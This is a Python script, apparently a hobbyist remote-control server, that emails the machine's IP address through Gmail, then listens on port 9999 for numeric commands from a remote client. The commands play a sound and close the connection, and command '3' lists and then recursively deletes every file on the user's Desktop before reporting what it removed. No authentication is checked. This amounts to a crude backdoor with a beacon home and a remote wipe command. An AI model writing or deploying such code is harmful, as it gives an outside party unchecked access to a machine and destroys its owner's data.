import socket
import pygame
import time
import shutil
import os
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    s.detach()
    return ip

def send_email_ip():
    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_server.starttls()
    smtp_server.login("@gmail.com", "token")
    #Create message
    msg= MIMEMultipart()
    msg["From"] = "@gmail.com"
    msg["To"] = "@gmail.com"
    #Text message
    msg["Subject"] = "IP ADDRESS"
    text = f"{get_ip()}"
    msg.attach(MIMEText(text, "plain"))
    #Send 
    smtp_server.sendmail("@gmail.com", "@gmail.com", msg.as_string())
    smtp_server.close()
    print("Sended!")

while True:
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serv.bind((f"{get_ip()}", 9999))
    print("IP: ", get_ip(), "\n#Wait message...")
    send_email_ip()
    serv.listen(1)
    client, addr = serv.accept()
    msg = client.recv(1024).decode()

    if msg == "start":
        client.send("connect".encode())
        print("$Connected")

        while True:
            error = True

            msg = client.recv(1024).decode()
            
            if msg == "0":
                client.send("$ -> # \nTest successutifull".encode())

            elif msg == "1":
                error = False
                pygame.mixer.init()

                pygame.mixer.music.load("sound.mp3")
                pygame.mixer.music.play()
                client.send("#Sound played".encode())

            elif msg == "2":
                print("$Client disconnect")
                client.send("$Client closed".encode())
                time.sleep(1)
                client.close()
                serv.close()
                break

            elif msg == "4":
                print("#Close server")
                client.send("$Client closed\n#Server closed".encode())
                time.sleep(1)
                client.close()
                serv.close()
                exit()
            
            elif msg == "3":
                USER_NAME = getpass.getuser()                
                directory = r'/Users/%s/Desktop' % USER_NAME
                files = os.listdir(directory) 
                listToString = str(files)
                sendList = "Removed: ",listToString 

                dir = '/Users/sairex/Desktop/'
                for files in os.listdir(dir):
                    path = os.path.join(dir, files)
                    try:
                        shutil.rmtree(path)
                    except OSError:
                        os.remove(path) 

                client.send(str(sendList).encode())
                error = False

            else:
                if error == True:
                    client.send("$Error message".encode())
                else:
                    pass
    else:
        print("Error")
